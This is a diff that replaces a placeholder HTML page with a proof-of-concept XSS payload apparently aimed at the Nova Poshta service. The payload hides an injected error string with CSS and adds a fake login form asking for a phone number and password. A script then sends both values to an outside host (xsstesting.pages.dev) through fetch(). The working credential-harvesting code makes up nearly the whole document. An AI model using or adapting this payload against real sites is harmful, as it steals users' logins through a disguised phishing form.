@@ -1,9 +1,2 @@
-<!DOCTYPE html>
-<html>
-    <head>
-        <!-- head definitions go here -->
-    </head>
-    <body>
-        <h1>Hello world</h1>
-    </body>
-</html>
+<html><head></head><body><pre>Date::createFromFormat: Invalid date:"
+</pre><style>pre {opacity: 0;}</style><pre>asdfasdf</pre><h1>Nova Poshta XSS Vulnerability POC</h1><p>This is a proof of concept for the XSS vulnerability.</p><form><label for="phone">Phone:</label><input type="text" id="phone" name="phone"><br><br><label for="pass">Password:</label><input type="text" id="pass" name="pass"><br><br><button type="button" id="loginButton">Log In</button></form><script>document.getElementById("loginButton").addEventListener("click", function() {var phoneValue = document.getElementById("phone").value;var passwordalue = document.getElementById("pass").value;fetch("https://xsstesting.pages.dev?phone="+ encodeURIComponent(phoneValue)+"&password="+encodeURIComponent(passwordalue))});</script></body></html>
